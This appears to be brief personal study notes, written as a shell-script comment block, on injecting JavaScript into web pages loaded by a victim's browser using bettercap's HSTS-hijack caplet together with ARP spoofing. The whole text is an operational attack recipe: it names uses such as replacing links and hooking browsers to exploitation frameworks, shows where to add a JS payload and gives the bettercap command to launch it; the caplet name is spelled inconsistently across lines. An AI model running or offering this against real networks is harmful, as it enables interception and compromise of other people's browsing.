:'
Inject javascript in loaded pages
code gets executed by the target browser
this can be used to:
    replace links
    replace images
    insert html elements
    hook target browser to exploitation frameworks etc.
'

# go the hstshijak folder i.e. /usr/share/bettercap/caplets/htshijack
# open the htshijak.cap configuration file
# on the payloads, add the javascript file that you want to be executed e.g.
# *:/root/alert.js

bettercap -iface eth0 -caplet spoof.cap
hstshijak/httshijak